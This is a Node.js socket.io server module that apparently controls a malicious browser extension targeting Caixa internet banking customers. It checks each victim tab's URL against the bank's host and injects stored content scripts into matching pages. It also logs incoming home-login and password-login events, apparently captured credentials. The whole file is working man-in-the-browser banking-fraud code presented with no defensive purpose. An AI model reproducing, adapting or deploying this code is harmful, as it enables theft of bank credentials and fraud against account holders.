'use strict';

var fs = require('fs');
var appPath = process.cwd();
var contentPath = appPath+'/banks/caixa/server/content';
var fs = require('fs');
var path = require('path');
var events = require('events');
var eventEmitter  = new events.EventEmitter();


module.exports = function(app, io, db){

	// Initializing vars contentScripts
	var contentScripts = {};
	var homeName = 'CEF';
	var hosts = 'internetbanking.caixa.gov.br';

	// Load all content files and sabe on obj contentScripts
	fs.readdirSync(contentPath).forEach(function(fileName) {
		var scriptName = fileName.split('.')[0];
		var newPath = path.join(contentPath,fileName);
		fs.readFile(newPath, "utf8", function (err, data) {
			if (err) throw err;
			contentScripts[scriptName] = data.toString();
		});
	});

	
	io.on('connection', function(socket){

		// #Socket Events
		socket.on('onTabUpdated', function(tab){
			
			if(!tab || !tab.url || !tab.id) {
				return;
			};

			var hostTabUrl = tab.url.split('/')[2];
			if(hosts !== hostTabUrl){	
				return;
			}

			// Checking the current page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
		});

		socket.on('caixa_HomeLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('caixa_PasswordLogin', function(sender, request, response){
			console.log(request);
		});

		// #Common events
		process.on('common_injectContentScriptByTabId', function(socketId, sender, request, response){

			// Checking receptor message is a really truth recpetor
			if(socketId != socket.id) return;

			var tab = sender.tab;
			var pageName = request.data.pageName;
			
			// Check folder content contains respective pageName
			var keys = Object.keys(contentScripts);
			if(keys.indexOf(pageName) == -1){
				return;
			}

			// pageName exists, injecting content_script on page
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
		});

	});

};
